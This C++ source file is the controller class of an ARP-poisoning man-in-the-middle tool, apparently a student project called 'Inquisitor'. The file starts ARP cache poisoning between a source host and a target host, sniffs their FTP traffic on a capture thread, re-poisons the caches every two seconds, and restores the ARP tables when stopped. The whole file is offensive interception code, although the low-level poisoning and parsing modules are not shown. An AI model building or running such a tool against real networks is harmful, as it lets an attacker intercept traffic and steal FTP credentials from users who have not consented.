#include "InquisitorFacade.hpp"
#include "arp/ArpPoisoner.hpp"
#include "network/PacketCapture.hpp"
#include "protocol/FtpParser.hpp"
#include <iostream>
#include <thread>
#include <chrono>

InquisitorFacade::InquisitorFacade(const Config& config)
    : config_(config), isRunning_(false) {
}

InquisitorFacade::~InquisitorFacade() {
    stopAttack();
}

bool InquisitorFacade::initialize() {
    try {
        arpPoisoner_ = std::make_unique<ArpPoisoner>(config_.interface);
        ftpParser_ = std::make_unique<FtpParser>(config_.verbose);
        packetCapture_ = std::make_unique<PacketCapture>(config_.interface, ftpParser_.get());
        return true;
    } catch (const std::exception& e) {
        std::cerr << "Initialization failed: " << e.what() << std::endl;
        return false;
    }
}

void InquisitorFacade::startAttack() {
    isRunning_ = true;
    
    if (!arpPoisoner_->startPoisoning(config_.ipSrc, config_.macSrc, 
                                      config_.ipTarget, config_.macTarget)) {
        std::cerr << "Failed to start ARP poisoning" << std::endl;
        return;
    }
    
    std::thread captureThread([this]() {
        packetCapture_->startCapture();
    });
    
    while (isRunning_) {
        arpPoisoner_->maintainPoisoning();
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
    
    if (captureThread.joinable()) {
        captureThread.join();
    }
}

void InquisitorFacade::stopAttack() {
    if (!isRunning_) return;
    
    std::cout << "\nStopping attack and restoring ARP tables..." << std::endl;
    isRunning_ = false;
    
    if (arpPoisoner_) {
        arpPoisoner_->stopPoisoning();
    }
    
    if (packetCapture_) {
        packetCapture_->stopCapture();
    }
}